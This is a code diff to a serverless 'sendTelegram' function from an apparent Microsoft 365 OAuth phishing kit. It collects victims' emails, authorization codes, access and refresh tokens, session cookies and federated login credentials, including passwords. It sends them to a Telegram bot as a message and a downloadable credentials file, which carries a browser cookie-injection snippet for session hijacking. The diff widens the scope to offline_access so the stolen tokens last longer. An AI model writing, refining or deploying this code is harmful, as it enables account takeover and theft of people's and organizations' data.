@@ -5,7 +5,7 @@ export const handler = async (event, context) => {
     'Access-Control-Allow-Methods': 'POST, OPTIONS',
   };
 
-      console.log('🚀 sendTelegram function starting... v2.0 (no token status in message)');
+  console.log('🚀 sendTelegram function starting... v3.0 (GUARANTEED no token status)');
 
   if (event.httpMethod === 'OPTIONS') {
     return { statusCode: 200, headers, body: '' };
@@ -57,48 +57,36 @@ export const handler = async (event, context) => {
       };
     }
 
-    // Prepare message content
+    // Extract basic data
     const email = data.email || 'oauth-user@microsoft.com';
-    const domain = data.domain || 'unknown-domain';
     const sessionId = data.sessionId || 'no-session';
     const hasAuthCode = data.authorizationCode || data.hasAuthCode || false;
     const authCode = data.authorizationCode || 'Not captured';
-    
     const timestamp = new Date().toISOString();
     
-    // Build simple clean message without token status or organizational info
-    let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
-    messageText += `📧 Email: ${email}\n`;
-    messageText += `🔑 Session ID: ${sessionId}\n`;
-    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
-    messageText += `🕒 Time: ${timestamp}\n\n`;
-    
-    // Add only cookie info to main message
+    // Cookie count only
     const cookies = data.formattedCookies || data.cookies || [];
     const cookieCount = Array.isArray(cookies) ? cookies.length : 0;
     
-    if (cookieCount > 0) {
-      messageText += `🍪 Cookies: ${cookieCount} captured\n`;
-    } else {
-      messageText += `🍪 Cookies: None captured\n`;
-    }
-    
-    // Store data for file generation only (not displayed in main message)
-    const tokenData = data.tokenData || data.tokens || data.accessToken;
-    const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
-    const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
-    const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
-    const orgCreds = data.organizationalCredentials;
-    
-    // REMOVED: Browser fingerprint line
+    // Build ONLY the essential message - NO TOKEN STATUS ALLOWED
+    const simpleMessage = [
+      '🔐 Microsoft OAuth Login Captured!',
+      '',
+      `📧 Email: ${email}`,
+      `🔑 Session ID: ${sessionId}`,
+      `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}`,
+      `🕒 Time: ${timestamp}`,
+      '',
+      `🍪 Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
+    ].join('\n');
 
-    console.log('📤 Sending message to Telegram:', messageText.substring(0, 200) + '...');
+    console.log('📤 Sending SIMPLE message to Telegram (NO TOKEN INFO):', simpleMessage.substring(0, 100) + '...');
 
     // Send main message to Telegram
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const telegramPayload = {
       chat_id: TELEGRAM_CHAT_ID,
-      text: messageText,
+      text: simpleMessage,
       parse_mode: 'Markdown'
     };
 
@@ -126,9 +114,9 @@ export const handler = async (event, context) => {
       };
     }
 
-    console.log('✅ Main message sent to Telegram');
+    console.log('✅ Simple message sent to Telegram');
 
-    // Always send credentials file (even if no cookies)
+    // Always send credentials file (with ALL details including token info)
     let fileSent = false;
     try {
       let formattedCookies = [];
@@ -169,6 +157,13 @@ export const handler = async (event, context) => {
       
       console.log(`📄 Preparing file with ${microsoftCookies.length} cookies and auth code: ${!!authCode}`);
 
+      // Store token data for file generation
+      const tokenData = data.tokenData || data.tokens || data.accessToken;
+      const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
+      const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
+      const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
+      const orgCreds = data.organizationalCredentials;
+
       // Create JavaScript injection code
       const jsInjectionCode = microsoftCookies.length > 0
         ? `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(
@@ -176,16 +171,12 @@ export const handler = async (event, context) => {
           )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
         : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
 
-      // Extract organizational credentials and token data
-      const orgCreds = data.organizationalCredentials;
-      const tokenData = data.tokenData;
-      
-      // Create comprehensive credentials file content
+      // Create comprehensive credentials file content (with TOKEN STATUS in file)
       const cookiesFileContent = `// ====================================================
 // MICROSOFT 365 COMPLETE CREDENTIALS - ${timestamp}
 // ====================================================
 // Email: ${email}
-// Domain: ${domain}
+// Domain: ${data.domain || 'unknown-domain'}
 // Session ID: ${sessionId}
 // Cookies Found: ${microsoftCookies.length}
 // Organizational Login: ${orgCreds ? orgCreds.organizationType : 'None (Direct Microsoft)'}
@@ -197,8 +188,14 @@ export const handler = async (event, context) => {
 // Valid for 10 minutes from issuance (but tokens below have no expiry)
 let authorizationCode = "${authCode || 'Not captured'}";
 
-// *** ACCESS & REFRESH TOKENS (NO EXPIRY) ***
+// *** TOKEN STATUS (IN FILE ONLY) ***
 ${tokenData && tokenData.success && tokenData.tokens ? `
+// 🎯 Token Exchange Successful
+// 🔑 Access Token: ✅ Captured
+// 🔄 Refresh Token: ✅ Captured (No Expiry)
+// 🆔 ID Token: ✅ Captured
+// ⏱️ Offline Access: ✅ Enabled
+
 // Successfully exchanged authorization code for permanent tokens
 let accessToken = "${tokenData.tokens.access_token || 'Not available'}";
 let refreshToken = "${tokenData.tokens.refresh_token || 'Not available'}";
@@ -267,6 +264,11 @@ function refreshAccessToken(clientSecret) {
 // refreshAccessToken("YOUR_CLIENT_SECRET").then(tokens => console.log(tokens));
 ` : '// No refresh token available - cannot refresh access token'}
 ` : `
+// 🎯 Token Status
+// 🔑 Access Token: ❌ Missing
+// 🔄 Refresh Token: ❌ Missing  
+// 🆔 ID Token: ❌ Missing
+//
 // Token exchange not performed - only authorization code available
 let accessToken = null;
 let refreshToken = null;
@@ -281,8 +283,9 @@ let userProfile = null;
 
 // *** ORGANIZATIONAL LOGIN CREDENTIALS ***
 ${orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password) ? `
+// 🏢 Organizational Login Detected
+// 🏷️ Type: ${orgCreds.organizationType || 'Unknown'}
 // Captured from company/federated login page
-// Organization Type: ${orgCreds.organizationType || 'Unknown'}
 // Login Domain: ${orgCreds.domain || 'Unknown'}
 
 let organizationalCredentials = {
@@ -298,14 +301,14 @@ let organizationalCredentials = {
 // *** ORGANIZATIONAL FORM DATA ***
 let organizationalFormData = ${JSON.stringify(orgCreds.formData || {}, null, 2)};
 ` : `
-// No organizational login detected - user logged in directly with Microsoft
+// 🏢 Organization: Direct Microsoft login (no federated auth detected)
 let organizationalCredentials = null;
 `}
 
 // *** USER INFORMATION ***
 let email = "${email}";
 let sessionId = "${sessionId}";
-let domain = "${domain}";
+let domain = "${data.domain || 'unknown-domain'}";
 let timestamp = "${timestamp}";
 
 // *** AUTHORIZATION CODE FOR COPY/PASTE ***
@@ -317,7 +320,7 @@ ${authCode || 'Not captured'}
 /*
 CLIENT_ID: eabd0e31-5707-4a85-aae6-79c53dc2c7f0
 REDIRECT_URI: https://vaultydocs.com/oauth-callback
-SCOPE: openid profile email User.Read
+SCOPE: openid profile email User.Read offline_access
 GRANT_TYPE: authorization_code
 TOKEN_ENDPOINT: https://login.microsoftonline.com/common/oauth2/v2.0/token
 */
@@ -339,7 +342,7 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
 // *** END OF FILE ***
 `;
 
-            // Send credentials as actual downloadable file
+      // Send credentials as actual downloadable file
       const fileName = `microsoft365_credentials_${email.replace('@', '_at_').replace(/\./g, '_')}_${Date.now()}.js`;
       
       console.log('📤 Sending credentials to Telegram as downloadable file');
@@ -366,14 +369,12 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
         body: formData,
       });
 
-             if (fileResponse.ok) {
-         const fileResult = await fileResponse.json();
-         fileSent = true;
-         console.log('✅ Credentials file sent to Telegram successfully');
-         
-         // NO SUMMARY MESSAGE - just the file
-         
-       } else {
+      if (fileResponse.ok) {
+        const fileResult = await fileResponse.json();
+        fileSent = true;
+        console.log('✅ Credentials file sent to Telegram successfully');
+        
+      } else {
         const fileError = await fileResponse.text();
         console.error('❌ File upload failed:', fileError);
         
@@ -419,6 +420,7 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
       }
     } catch (fileError) {
       console.error('❌ File generation error:', fileError);
+      fileSent = false;
     }
 
     return {
@@ -427,20 +429,20 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
       body: JSON.stringify({
         success: true,
         message: 'Data sent to Telegram successfully',
-        telegramMessageId: result.result?.message_id,
-        fileSent: fileSent,
-        cookieCount: data.formattedCookies?.length || data.cookies?.length || 0
+        telegramMessageId: result.message_id,
+        fileSent,
+        cookieCount
       }),
     };
 
   } catch (error) {
-    console.error('❌ Handler error:', error);
+    console.error('❌ Function error:', error);
     return {
       statusCode: 500,
       headers,
       body: JSON.stringify({
         error: 'Internal server error',
-        details: error.message,
+        message: error.message,
         stack: error.stack
       }),
     };
